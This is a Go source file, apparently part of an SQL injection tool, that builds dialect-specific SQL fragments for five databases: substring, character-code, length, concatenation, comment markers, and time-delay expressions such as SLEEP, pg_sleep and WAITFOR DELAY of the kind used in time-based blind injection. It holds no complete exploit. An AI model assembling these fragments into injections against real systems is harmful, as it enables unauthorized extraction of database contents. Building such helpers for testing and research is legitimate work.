package payloads

import (
	"fmt"
	"strconv"
	"strings"
)

type Dialect int

const (
	MySQL Dialect = iota
	Postgres
	SQLite
	MSSQL
	OracleDB
)

func (d Dialect) String() string {
	switch d {
	case MySQL:
		return "MySQL"
	case Postgres:
		return "Postgres"
	case SQLite:
		return "SQLite"
	case MSSQL:
		return "MSSQL"
	case OracleDB:
		return "Oracle"
	default:
		return "unknown"
	}
}

func (d Dialect) Substring(expr string, pos, length int) string {
	p, l := strconv.Itoa(pos), strconv.Itoa(length)
	switch d {
	case Postgres:
		return "SUBSTRING(" + expr + " FROM " + p + " FOR " + l + ")"
	case SQLite, OracleDB:
		return "SUBSTR(" + expr + "," + p + "," + l + ")"
	default:
		return "SUBSTRING(" + expr + "," + p + "," + l + ")"
	}
}

func (d Dialect) CharCode(expr string) string {
	switch d {
	case SQLite, MSSQL:
		return "UNICODE(" + expr + ")"
	default:
		return "ASCII(" + expr + ")"
	}
}

func (d Dialect) Length(expr string) string {
	switch d {
	case MSSQL:
		return "LEN(" + expr + ")"
	default:
		return "LENGTH(" + expr + ")"
	}
}

func (d Dialect) Sleep(seconds int) string {
	s := strconv.Itoa(seconds)
	switch d {
	case Postgres:
		return "pg_sleep(" + s + ")"
	case MSSQL:
		return fmt.Sprintf("WAITFOR DELAY '00:00:%02d'", seconds)
	case OracleDB:
		return "dbms_pipe.receive_message(('a')," + s + ")"
	case SQLite:
		// SQLite has no sleep; burn CPU as an approximation.
		return "randomblob(" + strconv.Itoa(seconds*100000000) + ")"
	default:
		return "SLEEP(" + s + ")"
	}
}

func (d Dialect) Comment() string {
	return "-- "
}

func (d Dialect) Concat(parts ...string) string {
	switch d {
	case MySQL:
		return "CONCAT(" + strings.Join(parts, ",") + ")"
	case MSSQL:
		return strings.Join(parts, "+")
	default:
		return strings.Join(parts, "||")
	}
}

func quoteStr(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func quoteChar(c byte) string {
	return quoteStr(string(c))
}
